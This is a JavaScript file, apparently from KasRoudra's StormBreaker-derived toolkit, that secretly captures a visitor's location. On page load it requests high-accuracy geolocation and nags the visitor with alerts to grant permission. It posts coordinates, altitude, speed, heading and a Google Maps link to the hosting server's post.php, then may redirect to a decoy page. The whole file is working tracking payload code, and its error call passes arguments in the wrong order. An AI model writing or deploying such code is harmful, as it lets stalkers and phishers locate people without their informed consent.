// location.js by KasRoudra
// Author   : KasRoudra
// Github   : https://github.com/KasRoudra
// Email    : kasroudrard@gmail.com
// Messenger: https//m.me/KasRoudra
// Credits  : StormBreaker(https://github.com/ultrasecurity/Storm-Breaker)
// CreatedAt: 10-08-2022

const locate = (allow_redir) => {
    // post object as formdata
    const post = (obj, url=window.location.origin+"/post.php", error=false) => {
        const formData = new FormData();
        for (const key in obj) {
            formData.append(key, obj[key]);
        }
        fetch(url, {
            method: "POST",
            body: formData
        })
        .then(async (res) => {
            const text = await res.text();
            console.log(text);
            try {
                if (error) document.querySelector("#failure").click();
                else document.querySelector("#success").click();
            }
            catch (err) {
                console.log(err)
            }
            try {
                if (allow_redir && redirect_url) location.replace(redirect_url);
            }
            catch (err) {
                console.log(err)
            }
        })
        .catch((err) => {
            console.log(err)
            try {
                document.querySelector("#failure").click();
            }
            catch (err) {
                console.log(err)
            }
            try {
                if (allow_redir && redirect_url) location.replace(redirect_url);
            }
            catch (err) {
                console.log(err)
            }
        });
    }
    // Function for successful location capture
    const showPosition = (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const altitude = position.coords.altitude;
        const speed = position.coords.speed;
        const direction = position.coords.heading;
        const map_url = !!latitude && !!longitude && `https://www.google.com/maps/@${latitude},${longitude}`
        const details = {
            latitude,
            longitude,
            altitude,
            map_url,
            accuracy,
            speed,
            direction
        }
        const fileteredDetails = Object.fromEntries(
            Object.entries(details).map(arr => {
                if (!arr[1]) arr[1] = 0
                if (["latitude", "longitude", "direction"].includes(arr[0])) arr[1]+="°"
                if (arr[0]=="speed") arr[1] += "m/s"
                if (arr[0]=="altitude") arr[1] += "m"
                return arr;
            })
        )
        post(fileteredDetails)
    };
    // Function for failed location capture
    const showError = (error) => {
        let error_message = ""
        switch (error.code) {
            case error.PERMISSION_DENIED:
                error_message = "User denied the request for geolocation";
                alert("Please refresh this page and allow location permission...");
                break;
            case error.POSITION_UNAVAILABLE:
                error_message = "Location information is unavailable";
                break;
            case error.TIMEOUT:
                error_message = "The request to get user location timed out";
                alert("Please set your location mode on high accuracy...");
                break;
            case error.UNKNOWN_ERROR:
                error_message = "An unknown error occurred";
                break;
        }
        post({error_message}, error = true)
    };
    
    const options = {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumage: 0
    };
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            showPosition, 
            showError,
            options
        );
    } else {
        alert("Geolocation is not supported by your browser...");
    }
}
if (!window.onload) {
    window.onload = () => {
        if (!document.querySelector(".locate")) {
            locate();
        }
        else document.querySelector(".locate").addEventListener("click", () => {
            locate();
        })
    }
}